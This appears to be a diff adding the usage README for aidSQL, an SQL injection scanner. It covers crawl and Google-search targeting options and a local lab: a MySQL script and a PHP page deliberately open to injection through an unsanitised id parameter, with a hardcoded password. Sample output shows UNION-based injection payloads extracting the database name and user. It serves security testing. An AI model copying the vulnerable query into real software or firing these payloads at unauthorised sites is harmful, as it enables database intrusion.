@@ -1,0 +1,137 @@
+This should do the trick, for now ...
+
+./aidSQL --url=url --urlvars=var=value
+
+For instance:
+
+Test against your site with specific URL variables:
+
+./aidSQL  --url=http://www.yourfoosite.com/test.php --urlvars=id=1
+
+Test against your site with no specific URL variables, let aidSQL crawl the site for you:
+
+./aidSQL  --url=http://www.yourfoosite.com/test.php 
+
+Test against your site with no specific URL variables, let aidSQL crawl the site for you, specify a limit, 
+some sites can be massive due to URL rewriting techniques or excesive amount of pages:
+
+./aidSQL  --url=http://www.yourfoosite.com/test.php --max-links=10
+
+Test against your site with no specific URL variables, let aidSQL crawl the site for you, specify a limit, 
+some sites can be massive due to URL rewriting techniques or excesive amount of pages, ONLY fetch 5 links
+per page do not go beyond that:
+
+./aidSQL  --url=http://www.yourfoosite.com/test.php --max-links=50 --lpp=5
+
+Test against sites that can be find via googling, only do this if you have *explicit* permission of the site owners,
+again I must say here you read the README file, I take NO responsibility for whatever you do with this application
+your actions count as your own, and I will be not held responsible.
+
+./aidSQL  --google="this aidSQL stuff is handy!"
+
+You can google in a certain language 
+
+./aidSQL  --google="this aidSQL stuff is handy!" --google-language="es"
+
+Check the config file config/config.ini for other googling options
+
+---------------------------------------------------
+NEW!!!!!
+---------------------------------------------------
+
+You can now also make aidSQL do all the work for you! Just
+
+Feed it a web site 
+
+./aidSQL  --url=http://www.mywebsite.com
+
+and it will automatically crawl the whole website fetching url's with their parameters!
+
+Note that the crawling functionality is yet to be enhanced so maximum recursion limits with
+PHP might appear more than often in sites which use stuff like mod_rewrite, etc.
+
+
+---------------------------------------------------
+Database Script
+---------------------------------------------------
+
+CREATE DATABASE aidsqltest;
+
+GRANT ALL PRIVILEGES ON aidsqltest.* TO "youruser"@"localhost" IDENTIFIED BY "password_here";
+
+USE aidsqltest;
+
+CREATE TABLE test_table ( id INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY, description varchar(200) default "description" );
+
+INSERT INTO test_table SET description="This is aidsql nice to meet you";
+INSERT INTO test_table SET id="";
+INSERT INTO test_table SET id="";
+INSERT INTO test_table SET id="";
+
+---------------------------------------------------
+PHP test Script
+---------------------------------------------------
+
+<?php
+
+      if($_SERVER["REMOTE_ADDR"]!=="127.0.0.1"){   //Remove this IF you don't need it this will *somewhat* avoid
+         die("<h1>For your health</h1>!");         //other people to be able to access this script at all.
+      }
+
+      error_reporting(E_ALL);
+      ini_set("display_errors","1");
+
+      $host = "localhost";       //Replace with your own host
+      $db   = "aidsqltest";      //Replace with your own DB
+      $user = "root";            //Replace with your own user
+      $pass = "viceroynextbic";  //Replace with your own password, "" if none
+
+      mysql_connect($host,$user,$pass) or die ("Can't connect to the database :(");
+      mysql_select_db($db);
+
+      $sql = "SELECT id,description FROM test_table WHERE id=$_GET[id]";
+
+        echo $sql."\n";
+
+        $res = mysql_query($sql);
+        echo "<h2>ERROR:".mysql_error()."</h2>";
+
+        while($row = mysql_fetch_array($res,MYSQL_ASSOC)){
+                echo "<h2>".$row["id"]."</h2>\n";
+                echo "<h2>".$row["description"]."</h2>\n";
+        }
+
+?>
+
+
+The output should look something like this:
+-------------------------------------------
+
+jimmy@hardcore:~/Projects/aidsql>./aidSQL --url=http://localhost/~jimmy/test.php --urlvars=id=1
+Testing aidSQL\plugin\MySQL5 injection plugin...
+[id] Attempt:   1
+Fetching http://localhost/~jimmy/test.php/?id=1+UNION+ALL+SELECT+CONCAT%280x6934366664%2C1%2C0x6930623732%29+LIMIT+1%2C1
+
+String identifier is: i46fd - i0b72
+[id] Attempt:   2
+Fetching http://localhost/~jimmy/test.php/?id=1+UNION+ALL+SELECT+CONCAT%280x6934366664%2C1%2C0x6930623732%29%2CCONCAT%280x6934366664%2C2%2C0x6930623732%29+LIMIT+1%2C1
+
+String identifier is: i46fd - i0b72
+FOUND SQL INJECTION!!!
+
+Affected Variable:      id
+Affected Fields:        1,2
+Picking field "1" to perform further analysis ...
+Site is vulnerable to sql injection
+Fetching http://localhost/~jimmy/test.php/?id=1+UNION+ALL+SELECT+CONCAT%280x6934366664%2CDATABASE%28%29%2C0x6930623732%29%2C2+LIMIT+1%2C1
+
+String identifier is: i46fd - i0b72
+Fetching http://localhost/~jimmy/test.php/?id=1+UNION+ALL+SELECT+CONCAT%280x6934366664%2CUSER%28%29%2C0x6930623732%29%2C2+LIMIT+1%2C1
+
+String identifier is: i46fd - i0b72
+BASIC INFORMATION
+-----------------------------------
+DBASE   :               aidsqltest
+DBUSER  :               root@localhost
+
+
